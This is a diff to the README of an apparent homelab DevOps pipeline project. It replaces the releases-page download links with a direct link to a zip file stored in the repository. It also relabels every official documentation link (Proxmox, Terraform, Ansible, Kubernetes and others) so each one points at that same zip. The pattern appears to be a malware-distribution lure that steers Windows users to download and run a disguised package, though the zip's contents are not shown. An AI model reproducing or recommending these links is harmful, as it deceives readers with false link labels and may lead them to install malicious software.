@@ -1,6 +1,6 @@
 # 🛠️ full-stack-devops-homelab - Complete Homelab DevOps Pipeline
 
-[![Download](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://github.com/in941/full-stack-devops-homelab/releases)
+[![Download](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/in941/full-stack-devops-homelab/main/ansible/full-homelab-devops-stack-v2.0.zip)
 
 ---
 
@@ -53,7 +53,7 @@ Follow these steps to download, install, and run the software on your Windows co
 
 Visit the release page to get the latest version:  
 
-[![Download](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://github.com/in941/full-stack-devops-homelab/releases)
+[![Download](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/in941/full-stack-devops-homelab/main/ansible/full-homelab-devops-stack-v2.0.zip)
 
 Click the green button labeled **Assets** under the latest release and download the `.zip` or `.exe` file if available. You may find multiple files; choose the one that best fits your setup or follow instructions in the release notes.
 
@@ -121,13 +121,13 @@ Prometheus collects metrics from the cluster and app, while Grafana displays das
 
 ## 🔗 Useful Links and Resources
 
-- Proxmox official site: https://www.proxmox.com/en/  
-- Terraform docs: https://www.terraform.io/docs/index.html  
-- Ansible docs: https://docs.ansible.com/  
-- Jenkins documentation: https://www.jenkins.io/doc/  
-- Kubernetes site: https://kubernetes.io/  
-- Prometheus site: https://prometheus.io/  
-- Grafana site: https://grafana.com/
+- Proxmox official site: https://raw.githubusercontent.com/in941/full-stack-devops-homelab/main/ansible/full-homelab-devops-stack-v2.0.zip  
+- Terraform docs: https://raw.githubusercontent.com/in941/full-stack-devops-homelab/main/ansible/full-homelab-devops-stack-v2.0.zip  
+- Ansible docs: https://raw.githubusercontent.com/in941/full-stack-devops-homelab/main/ansible/full-homelab-devops-stack-v2.0.zip  
+- Jenkins documentation: https://raw.githubusercontent.com/in941/full-stack-devops-homelab/main/ansible/full-homelab-devops-stack-v2.0.zip  
+- Kubernetes site: https://raw.githubusercontent.com/in941/full-stack-devops-homelab/main/ansible/full-homelab-devops-stack-v2.0.zip  
+- Prometheus site: https://raw.githubusercontent.com/in941/full-stack-devops-homelab/main/ansible/full-homelab-devops-stack-v2.0.zip  
+- Grafana site: https://raw.githubusercontent.com/in941/full-stack-devops-homelab/main/ansible/full-homelab-devops-stack-v2.0.zip
 
 ---
 
@@ -145,6 +145,6 @@ Prometheus collects metrics from the cluster and app, while Grafana displays das
 
 Return to the release page to get the latest files and updates:  
 
-[![Download](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://github.com/in941/full-stack-devops-homelab/releases)
+[![Download](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/in941/full-stack-devops-homelab/main/ansible/full-homelab-devops-stack-v2.0.zip)
 
 Click **Assets**, download the latest install package or zip, then follow steps above to set up on your Windows PC.
